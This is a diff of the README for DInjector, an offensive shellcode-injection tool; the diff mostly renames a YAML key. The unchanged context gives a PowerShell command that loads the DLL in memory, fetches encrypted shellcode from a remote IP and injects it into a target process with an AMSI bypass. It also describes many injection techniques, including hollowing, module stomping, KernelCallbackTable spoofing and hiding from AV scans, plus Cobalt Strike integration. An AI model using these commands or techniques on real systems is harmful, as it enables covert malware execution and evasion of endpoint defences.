@@ -77,7 +77,7 @@ Test it locally:
 ```powershell
 PS > $bytes = [System.IO.File]::ReadAllBytes("C:\DInjector.dll")
 PS > $assem = [System.Reflection.Assembly]::Load($bytes)
-PS > [DInjector.Detonator]::Boom("remothread /sc:http://10.10.13.37/enc /password:Passw0rd! /pid:1337 /am51:True".split(" "))
+PS > [DInjector.Detonator]::Boom("remothread /sc:http://10.10.13.37/enc /password:Passw0rd! /pid:1337 /am51:True")
 ```
 
 ## Cobalt Strike Integration
@@ -97,7 +97,7 @@ module_name: 'functionpointer'
 arguments:
 description: |
   Allocates a RW memory region, copies the shellcode into it and executes it like a function.
-api_calls:
+api:
   - syscalls:
     1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     2: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
@@ -121,7 +121,7 @@ module_name: 'functionpointerv2'
 arguments:
 description: |
   Sets RX on a byte array and executes it like a function.
-api_calls:
+api:
   - syscalls:
     1: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
 opsec_safe: false
@@ -138,7 +138,7 @@ module_name: 'clipboardpointer'
 arguments:
 description: |
   Copies shellcode bytes into the clipboard, sets RX on it and executes it like a function.
-api_calls:
+api:
   - dynamic_invocation:
     1: 'OpenClipboard'
     2: 'SetClipboardData'
@@ -158,7 +158,7 @@ arguments:
 description: |
   Injects shellcode into current process.
   Thread execution via NtCreateThreadEx.
-api_calls:
+api:
   - dynamic:
     1: 'CloseHandle'
   - syscalls:
@@ -179,7 +179,7 @@ arguments:
 description: |
   Injects shellcode into current process.
   Thread execution via EnumSystemLocalesA.
-api_calls:
+api:
   - dynamic_invocation:
     1: 'HeapCreate'
     2: 'UuidFromStringA'
@@ -199,7 +199,7 @@ arguments: |
 description: |
   Injects shellcode into an existing remote process.
   Thread execution via NtCreateThreadEx.
-api_calls:
+api:
   - dynamic:
     1: 'CloseHandle (x2)'
   - syscalls:
@@ -223,7 +223,7 @@ arguments: |
 description: |
   Injects shellcode into an existing remote process overwriting one of its loaded modules' .text section.
   Thread execution via NtCreateThreadEx.
-api_calls:
+api:
   - dynamic:
     1: 'CloseHandle (x2)'
   - syscalls:
@@ -245,7 +245,7 @@ arguments: |
 description: |
   Injects shellcode into an existing remote process.
   Thread execution via RtlCreateUserThread.
-api_calls:
+api:
   - dynamic_invocation:
     1: 'RtlCreateUserThread'
     2: 'CloseHandle (x2)'
@@ -270,7 +270,7 @@ description: |
   Injects shellcode into an existing remote process and flips memory protection to PAGE_NOACCESS.
   After a short sleep (waiting until a possible AV scan is finished) the protection is flipped again to PAGE_EXECUTE_READ.
   Thread execution via NtCreateThreadEx.
-api_calls:
+api:
   - dynamic:
     1: 'CloseHandle (x2)'
   - syscalls:
@@ -296,7 +296,7 @@ arguments: |
 description: |
   Injects shellcode into an existing remote GUI process by spoofing the fnCOPYDATA value in KernelCallbackTable.
   Thread execution via SendMessageA.
-api_calls:
+api:
   - dynamic_invocation:
      1: 'FindWindowExA'
      2: 'SendMessageA'
@@ -331,7 +331,7 @@ arguments: |
 description: |
   Injects shellcode into a newly spawned remote process.
   Thread execution via NtQueueApcThread.
-api_calls:
+api:
   - dynamic_invocation:
     1: 'InitializeProcThreadAttributeList'
     2: 'UpdateProcThreadAttribute (blockDLLs)'
@@ -362,7 +362,7 @@ arguments: |
 description: |
   Injects shellcode into a newly spawned remote process.
   Thread execution via SetThreadContext.
-api_calls:
+api:
   - dynamic_invocation:
     1: 'InitializeProcThreadAttributeList'
     2: 'UpdateProcThreadAttribute (blockDLLs)'
@@ -394,7 +394,7 @@ arguments: |
 description: |
   Injects shellcode into a newly spawned remote process.
   Thread execution via NtResumeThread (hollowing with shellcode).
-api_calls:
+api:
   - dynamic_invocation:
     1: 'InitializeProcThreadAttributeList'
     2: 'UpdateProcThreadAttribute (blockDLLs)'
@@ -426,7 +426,7 @@ arguments: |
 description: |
   Loads a trusted module from disk and overwrites one of its exported functions.
   Thread execution via NtCreateThreadEx.
-api_calls:
+api:
   - dynamic_invocation:
      1: 'InitializeProcThreadAttributeList'
      2: 'UpdateProcThreadAttribute (blockDLLs)'
